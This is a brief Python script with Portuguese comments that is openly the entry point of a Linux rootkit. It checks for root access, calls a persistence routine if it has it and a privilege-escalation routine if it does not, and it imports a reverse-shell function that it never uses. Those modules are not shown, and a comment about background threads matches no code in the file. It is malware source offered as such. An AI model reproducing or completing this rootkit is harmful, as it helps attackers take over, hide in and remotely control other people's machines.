#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import subprocess
import threading

# External script
from privilege_scalation import elevar_privilegio
from persistence import get_persistence
from reverse_shell import remote_shell

# Função para verificar se o usuário é root
def check_root():
    return os.geteuid() == 0

# Função principal rootkit 
def rootkit_main(): 
    if check_root():
        # Criar threads para executar as funções em segundo plano
        get_persistence()
        
    else:
        elevar_privilegio()
        
# Chamada para iniciar o rootkit
if __name__ == "__main__":
    rootkit_main()
